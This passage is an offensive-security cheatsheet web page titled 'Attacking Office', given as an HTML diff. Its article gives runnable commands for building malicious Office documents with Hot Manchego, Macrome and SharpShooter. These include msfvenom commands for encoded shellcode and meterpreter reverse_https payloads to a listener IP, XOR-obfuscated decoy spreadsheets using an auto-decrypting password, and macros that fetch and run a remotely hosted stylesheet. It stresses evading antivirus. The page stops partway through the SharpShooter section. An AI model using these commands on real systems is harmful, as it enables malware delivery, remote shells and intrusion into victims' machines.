@@ -1,0 +1,2259 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A quick reference and/or cheatsheet for attacking Microsoft Office.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Attacking Office" />
+<meta property="og:description" content="A quick reference and/or cheatsheet for attacking Microsoft Office." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/office_attacks/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-03T00:00:00+00:00" />
+<title>Attacking Office | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="active">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Attacking Office</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#office---attacks">Office - Attacks</a>
+      <ul>
+        <li><a href="#xlsm---hot-manchego">XLSM - Hot Manchego</a></li>
+        <li><a href="#xlm---macrome">XLM - Macrome</a></li>
+        <li><a href="#xlm-excel-40---sharpshooter">XLM Excel 4.0 - SharpShooter</a></li>
+        <li><a href="#xlm-excel-40---excelntdonut">XLM Excel 4.0 - EXCELntDonut</a></li>
+        <li><a href="#xlm-excel-40---exec">XLM Excel 4.0 - EXEC</a></li>
+        <li><a href="#docm---metasploit">DOCM - Metasploit</a></li>
+        <li><a href="#docm---download-and-execute">DOCM - Download and Execute</a></li>
+        <li><a href="#docm---macro-creator">DOCM - Macro Creator</a></li>
+        <li><a href="#docm---c-converted-to-office-vba-macro">DOCM - C# converted to Office VBA macro</a></li>
+        <li><a href="#docm---vba-wscript">DOCM - VBA Wscript</a></li>
+        <li><a href="#docm---vba-shell-execute-comment">DOCM - VBA Shell Execute Comment</a></li>
+        <li><a href="#docm---vba-spawning-via-svchostexe-using-scheduled-task">DOCM - VBA Spawning via svchost.exe using Scheduled Task</a></li>
+        <li><a href="#docm---wmi-com-functions">DOCM - WMI COM functions</a></li>
+        <li><a href="#docmxlm---macro-pack---macro-and-dde">DOCM/XLM - Macro Pack - Macro and DDE</a></li>
+        <li><a href="#docm---badassmacros">DOCM - BadAssMacros</a></li>
+        <li><a href="#docm---cactustorch-vba-module">DOCM - CACTUSTORCH VBA Module</a></li>
+        <li><a href="#docm---mmg-with-custom-dl--exec">DOCM - MMG with Custom DL + Exec</a></li>
+        <li><a href="#docm---activex-based-inkpicture-control-painted-event-autorun-macro">DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro</a></li>
+        <li><a href="#vba-obfuscation">VBA Obfuscation</a></li>
+        <li><a href="#vba-purging">VBA Purging</a>
+          <ul>
+            <li><a href="#officepurge">OfficePurge</a></li>
+            <li><a href="#evilclippy">EvilClippy</a></li>
+          </ul>
+        </li>
+        <li><a href="#vba---offensive-security-template">VBA - Offensive Security Template</a></li>
+        <li><a href="#vba---amsi">VBA - AMSI</a></li>
+        <li><a href="#docx---template-injection">DOCX - Template Injection</a>
+          <ul>
+            <li><a href="#remote-template">Remote Template</a></li>
+            <li><a href="#template-injections-tools">Template Injections Tools</a></li>
+          </ul>
+        </li>
+        <li><a href="#docx---dde">DOCX - DDE</a></li>
+        <li><a href="#slk---excel">SLK - Excel</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="office---attacks">
+  Office - Attacks
+  <a class="anchor" href="#office---attacks">#</a>
+</h1>
+<h2 id="xlsm---hot-manchego">
+  XLSM - Hot Manchego
+  <a class="anchor" href="#xlsm---hot-manchego">#</a>
+</h2>
+<blockquote>
+<p>When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn&rsquo;t catch a simple lolbas payload to get a beacon on a target machine.</p>
+</blockquote>
+<ul>
+<li>
+  <a href="https://github.com/FortyNorthSecurity/hot-manchego">https://github.com/FortyNorthSecurity/hot-manchego</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Generate CS Macro and save it to Windows as vba.txt
+</span></span><span style="display:flex;"><span>PS&gt; New-Item blank.xlsm
+</span></span><span style="display:flex;"><span>PS&gt; C:\Windows\Microsoft.NET\Framework\v4.0.<span style="color:#ae81ff">30319</span>\csc.exe /reference<span style="color:#960050;background-color:#1e0010">:</span>EPPlus.dll hot-manchego.cs
+</span></span><span style="display:flex;"><span>PS&gt; .\hot-manchego.exe .\blank.xlsm .\vba.txt
+</span></span></code></pre></div><h2 id="xlm---macrome">
+  XLM - Macrome
+  <a class="anchor" href="#xlm---macrome">#</a>
+</h2>
+<blockquote>
+<p>XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.</p>
+</blockquote>
+<ul>
+<li>
+  <a href="https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip">https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip</a></li>
+<li>
+  <a href="https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip">https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip</a></li>
+<li>
+  <a href="https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip">https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># NOTE: The payload cannot contains NULL bytes.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Default calc</span>
+</span></span><span style="display:flex;"><span>msfvenom -a x86 -b <span style="color:#e6db74">&#39;\x00&#39;</span> --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed <span style="color:#f92672">-f</span> raw EXITFUNC=thread &gt; popcalc.bin
+</span></span><span style="display:flex;"><span>msfvenom -a x64 -b <span style="color:#e6db74">&#39;\x00&#39;</span> --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor <span style="color:#f92672">-f</span> raw EXITFUNC=thread &gt; popcalc64.bin
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Custom shellcode</span>
+</span></span><span style="display:flex;"><span>msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai <span style="color:#f92672">-f</span> raw -o shellcode-<span style="color:#ae81ff">86</span>.bin -b <span style="color:#e6db74">&#39;\x00&#39;</span>
+</span></span><span style="display:flex;"><span>msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic <span style="color:#f92672">-f</span> raw -o shellcode-<span style="color:#ae81ff">64</span>.bin -b <span style="color:#e6db74">&#39;\x00&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># MSF shellcode</span>
+</span></span><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<span style="color:#ae81ff">192.168</span>.1.59 LPORT=<span style="color:#ae81ff">443</span> -b <span style="color:#e6db74">&#39;\x00&#39;</span>  -a x64 --platform windows -e x64/xor_dynamic --platform windows <span style="color:#f92672">-f</span> raw -o msf64.bin
+</span></span><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_https LHOST=<span style="color:#ae81ff">192.168</span>.1.59 LPORT=<span style="color:#ae81ff">443</span> -b <span style="color:#e6db74">&#39;\x00&#39;</span> -a x86 --encoder x86/shikata_ga_nai --platform windows <span style="color:#f92672">-f</span> raw -o msf86.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin
+</span></span><span style="display:flex;"><span>dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-<span style="color:#ae81ff">86</span>.bin --payload64-bit shellcode-<span style="color:#ae81ff">64</span>.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># For VBA Macro</span>
+</span></span><span style="display:flex;"><span>Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output<span style="color:#f92672">-file</span>-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
+</span></span></code></pre></div><p>When using Macrome build mode, the &ndash;password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of <strong>VelvetSweatshop</strong> is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.</p>
+<h2 id="xlm-excel-40---sharpshooter">
+  XLM Excel 4.0 - SharpShooter
+  <a class="anchor" href="#xlm-excel-40---sharpshooter">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Options</span>
+</span></span><span style="display:flex;"><span>-rawscfile &lt;path&gt;  Path to raw shellcode file <span style="color:#66d9ef">for</span> stageless payloads
+</span></span><span style="display:flex;"><span>--scfile &lt;path&gt;    Path to shellcode file as CSharp byte array
+</span></span><span style="display:flex;"><span>python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creation of a VBA Macro</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.</span>
+</span></span><span style="display:flex;"><span>SharpShooter.py --stageless --dotnetver <span style="color:#ae81ff">2</span> --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.168</span>.2.<span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>/foo.xsl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creation of an Excel 4.0 SLK Macro Enabled Document</span>
+</span></span><span style="display:flex;"><span>~<span style="color:#75715e"># /!\ The shellcode cannot contain null bytes</span>
+</span></span><span style="display:flex;"><span>msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai <span style="color:#f92672">-f</span> raw -o shellcode-encoded.bin -b <span style="color:#e6db74">&#39;\x00&#39;</span>
+</span></span><span style="display:flex;"><span>SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai <span style="color:#f92672">-f</span> raw -o /tmp/shellcode-<span style="color:#ae81ff">86</span>.bin -b <span style="color:#e6db74">&#39;\x00&#39;</span>
+</span></span><span style="display:flex;"><span>SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-<span style="color:#ae81ff">86</span>.bin --smuggle --template mcafee
